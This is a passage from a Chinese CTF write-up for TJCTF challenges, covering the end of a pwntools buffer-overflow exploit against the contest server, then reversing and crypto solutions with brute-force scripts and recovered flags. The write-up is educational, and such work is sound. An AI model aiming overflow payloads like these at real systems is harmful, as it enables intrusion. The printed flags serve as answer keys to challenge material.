+    key=[135671108,595838664,1011601882,513191674,2009753104,349832342,331399739,542649975,2075767462,2096169090]
+    key2=""
+    for i in key:
+      key2+=p32(i)
+    print int(time.time())
+    while True:
+       if  int(time.time())==1533965040:
+          p=remote("problem1.tjctf.org",8000)
+          print int(time.time())
+          print p.recvuntil("?")
+          payload="A"*64+key2+"AAAA"+p32(0x2152411b)
+          p.sendline(payload)
+          p.interactive()
+    
+
+## 0x08 Validator
+
+首先定义了一段字符串
+
+    
+    
+    mov     dword ptr [ebp+s1], 74636A74h
+    mov     [ebp+var_34], 756A7B66h
+    mov     [ebp+var_30], 635F3735h
+    mov     [ebp+var_2C], 5F6C6C34h
+    mov     [ebp+var_28], 725F336Dh
+    mov     [ebp+var_24], 72337633h
+    mov     [ebp+var_20], 365F3335h
+    mov     [ebp+var_1C], 665F6430h
+    mov     [ebp+var_18], 5F6D3072h
+    mov     [ebp+var_14], 5F77306Eh
+    mov     [ebp+var_10], 7D6E30h
+    
+
+提取出来是：
+
+    
+    
+    tjctf{ju57_c4ll_m3_r3v3r53_60d_fr0m_n0w_0n}
+    
+
+而后对其中几个字符进行了替换：
+
+    
+    
+    mov     byte ptr [ebp+var_28+3], 33h
+    mov     byte ptr [ebp+var_24+2], 33h
+    mov     byte ptr [ebp+var_20], 33h
+    mov     byte ptr [ebp+var_24], 35h
+    mov     byte ptr [ebp+var_24+1], 72h
+    mov     byte ptr [ebp+var_20+1], 72h
+    mov     byte ptr [ebp+var_24+3], 76h
+    
+
+直接动态调试过程中copy下来即可：  
+
+## 0x09 Python Reversing
+
+source：
+
+    
+    
+    import numpy as np
+    
+    flag = 'redacted'
+    
+    np.random.seed(12345)
+    arr = np.array([ord(c) for c in flag])
+    other = np.random.randint(1,5,(len(flag)))
+    arr = np.multiply(arr,other)
+    
+    b = [x for x in arr]
+    lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]
+    c = [b[i]^lmao[i] for i,j in enumerate(b)]
+    print(''.join(bin(x)[2:].zfill(8) for x in c))
+    
+    # original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101
+    
+
+很显然seed确定，从前向后按位破解即可：
+
+    
+    
+    import numpy as np
+    
+    key="1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101"
+    print(len(key))
+    ans2=""
+    flag = ''
+    for q in range(25):
+      for w in range(30,127):
+       flag=ans2+chr(w)
+       np.random.seed(12345)
+       arr = np.array([ord(c) for c in flag])
+       other = np.random.randint(1,5,(len(flag)))
+       arr = np.multiply(arr,other)
+    
+       b = [x for x in arr]
+       lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]
+       c = [b[i]^lmao[i] for i,j in enumerate(b)]
+       t=''.join(bin(x)[2:].zfill(8) for x in c)
+       if t[len(t)-9:len(t)]==key[len(t)-9:len(t)]:
+           ans2+=chr(w)
+           print(ans2)
+           break
+    
+    # original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101
+    
+
+## 0x0A Bad Cipher
+
+source:
+
+    
+    
+    message = "[REDACTED]"
+    key = ""
+    
+    r,o,u,x,h=range,ord,chr,"".join,hex
+    def e(m,k):
+     l=len(k);s=[m[i::l]for i in r(l)]
+     for i in r(l):
+      a,e=0,""
+      for c in s[i]:
+       a=o(c)^o(k[i])^(a>>2)
+       e+=u(a)
+      s[i]=e
+     return x(h((1<<8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))
+    
+    print(e(message,key))
+    
+
+hint：
+
+    
+    
+    Written by nthistle
+    My friend insisted on using his own cipher program to encrypt this flag, but I don't think it's very secure. Unfortunately, he is quite good at Code Golf, and it seems like he tried to make the program as short (and confusing!) as possible before he sent it.
+    I don't know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?
+    
+
+原程序进行了简化  
+还原一下：
+
+    
+    
+    def e(mes,k):
+     l=len(k)
+     s=[mes[i::l]for i in range(l)]
+     print(s)
+     for i in range(l):
+      a,e=0,""
+      for c in s[i]:
+       a=ord(c)^ord(k[i])^(a>>2)
+       e+=chr(a)
+      s[i]=e
+     return "".join(hex(ord(f))[2:]for f in "".join("".join(y)for y in zip(*s)))
+    
+
+可以看到  
+类似AES加密中间一步的操作  
+根据hint：
+
+    
+    
+    I don't know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?
+    
+
+密钥长度未知，但是原文只有flag  
+说明:
+
+    
+    
+    len(flag)%len(key)=0
+    
+
+否则原文最终会丢弃取模后的余数，导致最终密文不完整，也就无法反解出flag  
+根据密文：
+
+    
+    
+    473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554
+    
+
+len(flag)=56  
+猜测len(key)=7或者8  
+ **根据算法解密,并根据flag开头为”tjctf{“按位爆破key前6位，再随机组合爆破后几位(猜测1或2)** ：
+
+    
+    
+    m="473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554".decode("hex")
+    ans2="tjctf{"
+    for qw in range(32,127):
+        for er in range(32,127):
+    #        for ty in range(32,127):
+                k="3V@mK<"+chr(qw)+chr(er)
+                l=len(k)
+                s=[m[i::l]for i in range(l)]
+                for i in range(l):
+                  a,e="",""
+                  a=s[i][0]
+                  t=chr(ord(s[i][0])^ord(k[i]))
+                  for c in s[i][1:]:
+                   e+=chr(ord(c)^ord(k[i])^(ord(a)>>2))
+                   a=c
+                  s[i]=t+e
+                ans="".join(f for f in "".join("".join(y)for y in zip(*s)))
+                if ans[len(ans)-1:len(ans)]=="}":
+                    print k,ans
+    
+
+(其实这里可以对ans进行过滤，使其只print全为可见字符的一组，不过直接跑出来锁定的数据也比较少，可以直接找到flag)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **SeaSay** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/156443](/post/id/156443)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [逆向工程](/tag/逆向工程)
+  * [TJCTF](/tag/TJCTF)
+
+ **+1** __8赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t015d8969db33fedbcd.png) SeaSay
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
